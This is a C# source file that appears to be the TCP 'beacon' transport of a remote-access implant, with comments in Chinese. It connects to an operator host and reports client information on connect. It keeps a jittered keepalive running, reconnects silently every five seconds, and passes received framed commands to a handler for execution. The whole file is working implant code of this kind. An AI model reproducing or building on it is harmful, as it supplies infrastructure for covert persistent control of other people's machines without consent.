using Beacon.Helper;
using Beacon.MessagePackLib;
using MPLib.MP;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime;
using System.Text;
using System.Threading;
using static Beacon.Helper.Helper;

namespace Beacon
{
    internal class TCPBeacon
    {
        private TcpClient _tcp;
        private NetworkStream _stream;
        private byte[] _recvBuffer = new byte[8192];
        private byte[] _accumulator = new byte[0];
        private readonly object _sendLock = new object();
        private static Timer KeepAlive { get; set; }
        public static List<BeaconMsgPack> Packs = BeaconHandle.Packs;

        // 重连相关字段
        private string _host;
        private int _port;
        private bool _shouldReconnect = true;
        private bool _isConnected = false;
        private readonly object _reconnectLock = new object();

        public bool Connect(string host, int port)
        {
            lock (_reconnectLock)
            {
                _host = host;
                _port = port;
                _shouldReconnect = true;
            }

            return TryConnect();
        }

        private bool TryConnect()
        {
            try
            {
                // 清理旧连接
                CleanupConnection();

                _tcp = new TcpClient();
                _tcp.NoDelay = true;
                _tcp.Connect(_host, _port);
                _stream = _tcp.GetStream();

                _isConnected = true;

                var t = new Thread(ReceiveLoop) { IsBackground = true };
                t.Start();
                SendFramed(BeaconHandle.BuildClientInfo());
                KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null,
                    new Random().Next(10 * 1000, 15 * 1000),
                    new Random().Next(10 * 1000, 15 * 1000));
                return true;
            }
            catch
            {
                _isConnected = false;
                return false;
            }
        }

        private void CleanupConnection()
        {
            try
            {
                KeepAlive?.Dispose();
                _stream?.Close();
                _tcp?.Close();
            }
            catch { }
        }

        public void StartReconnectLoop()
        {
            var reconnectThread = new Thread(() =>
            {
                while (_shouldReconnect)
                {
                    lock (_reconnectLock)
                    {
                        if (!_isConnected && _shouldReconnect)
                        {
                            if (TryConnect())
                            {
                                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] 重连成功: {_host}:{_port}");
                            }
                            else
                            {
                                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] 重连失败，5秒后重试: {_host}:{_port}");
                            }
                        }
                    }

                    Thread.Sleep(5000); // 5秒间隔
                }
            })
            { IsBackground = true };

            reconnectThread.Start();
        }

        public void StopReconnect()
        {
            lock (_reconnectLock)
            {
                _shouldReconnect = false;
                _isConnected = false;
            }
            CleanupConnection();
        }

        // 统一到 BeaconHandle.BuildClientInfo

        private void SendFramed(byte[] payload)
        {
            if (_stream == null || !_isConnected) return;
            var length = payload.Length;
            var header = new byte[4];
            header[0] = (byte)((length >> 24) & 0xFF);
            header[1] = (byte)((length >> 16) & 0xFF);
            header[2] = (byte)((length >> 8) & 0xFF);
            header[3] = (byte)(length & 0xFF);

            lock (_sendLock)
            {
                try
                {
                    _stream.Write(header, 0, 4);
                    _stream.Write(payload, 0, payload.Length);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] 发送数据失败: {ex.Message}");
                    lock (_reconnectLock)
                    {
                        _isConnected = false;
                    }
                }
            }
        }

        private void ReceiveLoop()
        {
            try
            {
                while (_isConnected)
                {
                    int read = _stream.Read(_recvBuffer, 0, _recvBuffer.Length);
                    if (read <= 0)
                    {
                        Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] 连接断开，将尝试重连");
                        break;
                    }

                    AppendToAccumulator(_recvBuffer, read);
                    ProcessAccumulator();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] 接收数据异常: {ex.Message}");
            }
            finally
            {
                // 标记为未连接状态，触发重连
                lock (_reconnectLock)
                {
                    _isConnected = false;
                }
            }
        }

        private void AppendToAccumulator(byte[] data, int count)
        {
            var combined = new byte[_accumulator.Length + count];
            Buffer.BlockCopy(_accumulator, 0, combined, 0, _accumulator.Length);
            Buffer.BlockCopy(data, 0, combined, _accumulator.Length, count);
            _accumulator = combined;
        }

        private void ProcessAccumulator()
        {
            int offset = 0;
            while (true)
            {
                if (_accumulator.Length - offset < 4) break;

                int payloadLength =
                    (_accumulator[offset] << 24) |
                    (_accumulator[offset + 1] << 16) |
                    (_accumulator[offset + 2] << 8) |
                    _accumulator[offset + 3];

                if (payloadLength < 0 || payloadLength > 16 * 1024 * 1024)
                {
                    try { _tcp.Close(); } catch { }
                    return;
                }

                if (_accumulator.Length - offset - 4 < payloadLength) break;

                var payload = new byte[payloadLength];
                Buffer.BlockCopy(_accumulator, offset + 4, payload, 0, payloadLength);
                OnFrame(payload);

                offset += 4 + payloadLength;
            }

            if (offset > 0)
            {
                var remaining = _accumulator.Length - offset;
                var tail = new byte[remaining];
                if (remaining > 0)
                {
                    Buffer.BlockCopy(_accumulator, offset, tail, 0, remaining);
                }
                _accumulator = tail;
            }
        }
        public void Error(string ex, string CID) => BeaconHandle.SendError(SendFramed, ex, CID);
        public void Log(string message, string CID) => BeaconHandle.SendLog(SendFramed, message, CID);
        public void KeepAlivePacket(object obj) => BeaconHandle.KeepAlive(SendFramed);

        private void OnFrame(byte[] payload) => BeaconHandle.OnFrame(SendFramed, payload);

        private void Invoke(BeaconMsgPack unpack_msgpack) => BeaconHandle.Invoke(SendFramed, unpack_msgpack);
    }
}


